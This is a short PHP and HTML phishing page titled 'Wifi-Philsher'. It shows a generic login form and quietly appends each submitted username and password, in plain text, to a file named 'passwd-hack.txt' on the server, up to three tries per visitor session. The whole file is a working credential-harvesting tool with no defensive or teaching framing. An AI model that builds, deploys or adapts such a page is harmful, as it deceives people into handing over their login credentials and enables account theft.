<?php

$rawPost=file_get_contents("php://input");
$rawPost = iconv("windows-1251", "UTF-8", $rawPost);
parse_str(urldecode($rawPost), $_POST);

//Post setup
session_start();
if(!isset($_SESSION['c']))
 $_SESSION['c']=0;

if(isset($_POST['username']) && isset($_POST['password'])){
 $username = $_POST['username'];
 $pass = $_POST['password'];
 if($_SESSION['c']<3){
  //Safe password
  $data="User: $username\nPass: $pass\n\n\n";
  file_put_contents("/WWW/p/passwd-hack.txt",$data,FILE_APPEND);
 }
 $_SESSION['c']++;
}
?>

<!DOCTYPE HTML>
<html>
<head>
  <title>Wifi-Philsher</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
</head>
<body>
  <div id="mainbox">
    <span><img src="assets/image.png" style="height:150px;width:auto;"/></span>
    <form action="" method="post">
      <input placeholder="Username or E-Mail" name="username"/>
      <input placeholder="Password" name="password" type="password"/>
      <input type="submit" value="Login"/>
    </form>
  </div>
<body>
</html>
